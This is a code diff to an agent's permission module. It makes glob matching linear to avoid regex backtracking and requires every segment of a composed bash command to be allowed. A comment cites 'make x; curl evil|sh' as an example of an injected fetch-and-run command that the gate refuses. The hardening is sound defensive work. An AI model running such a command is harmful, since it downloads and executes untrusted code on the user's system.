@@ -138,30 +138,67 @@ export function loadRules(path: string): PermissionRules {
   return parseRules(readFileSync(path, "utf8"));
 }
 
-export function escapeRegex(value: string): string {
-  return value.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-}
-
-/** Glob where `*` spans any characters (including `/`); everything else literal. */
-export function globToRegExp(pattern: string): RegExp {
-  return new RegExp(`^${pattern.split("*").map(escapeRegex).join(".*")}$`);
+/** Linear glob match: `*` spans any characters (including `/`), everything
+ * else is literal. Segment-anchored like `^a.*b.*c$` but implemented with
+ * ordered indexOf scans — no regex, so multi-star patterns cannot trigger
+ * catastrophic backtracking (red-team finding on the hot-read path). */
+export function globMatches(pattern: string, value: string): boolean {
+  const parts = pattern.split("*");
+  if (parts.length === 1) return value === pattern; // no star: exact match
+  const first = parts[0] ?? "";
+  const last = parts.at(-1) ?? "";
+  if (!value.startsWith(first)) return false;
+  const end = value.length - last.length;
+  let index = first.length;
+  for (let i = 1; i < parts.length - 1; i++) {
+    const part = parts[i] ?? "";
+    if (part === "") continue;
+    const found = value.indexOf(part, index);
+    if (found === -1 || found + part.length > end) return false;
+    index = found + part.length;
+  }
+  return end >= index && value.endsWith(last);
 }
 
 export function matches(patterns: string[] | undefined, value: string): boolean {
   return (patterns ?? [])
-    .filter((pattern): pattern is string => typeof pattern === "string")
-    .some((pattern) => globToRegExp(pattern).test(value));
+    .filter((pattern) => typeof pattern === "string")
+    .some((pattern) => globMatches(pattern, value));
+}
+
+/** Composition characters that split a bash command into independently
+ * gated segments (`;`, `&&`, `&`, `||`, `|`, newlines). Substitution and
+ * redirection (` ` ` `>`, `<`, `$(`) never compose — they always ask. */
+const SEGMENT_SPLIT = /&&|\|\||[;&|\n\r]/;
+const NEVER_COMPOSE = /[`<>]|\$\(/;
+
+/** A full-command allow hit grants execution only when every composed
+ * segment independently matches an allow pattern: `"echo *"` + `"sleep *"`
+ * allow `echo a && sleep 1 && echo b`, while `"make *"` never allows
+ * `make x; curl evil|sh` (the curl/sh segments match nothing). */
+export function composedAllows(patterns: string[] | undefined, command: string): boolean {
+  if (NEVER_COMPOSE.test(command)) return false;
+  if (!SEGMENT_SPLIT.test(command)) return true;
+  const segments = command
+    .split(SEGMENT_SPLIT)
+    .map((segment) => segment.trim())
+    .filter((segment) => segment.length > 0);
+  return segments.length > 0 && segments.every((segment) => matches(patterns, segment));
 }
 
 /**
  * Decision order (design.md): mode short-circuits patterns; block beats allow;
  * everything else asks. `allow-all` bypasses block lists by literal semantics.
+ * A bash allow hit downgrades to ask unless every composed segment is itself
+ * allowed (composition is never granted by a single prefix).
  */
 export function decide(rules: PermissionRules, tool: GatedTool, value: string): PermissionDecision {
   if (rules.mode === "allow-all") return "allow";
   if (rules.mode === "block-all") return "block";
   const toolRules: ToolRules | undefined = rules[tool];
   if (matches(toolRules?.blockPatterns, value)) return "block";
-  if (matches(toolRules?.allowPatterns, value)) return "allow";
+  if (matches(toolRules?.allowPatterns, value)) {
+    return tool === "bash" && !composedAllows(toolRules?.allowPatterns, value) ? "ask" : "allow";
+  }
   return "ask";
 }
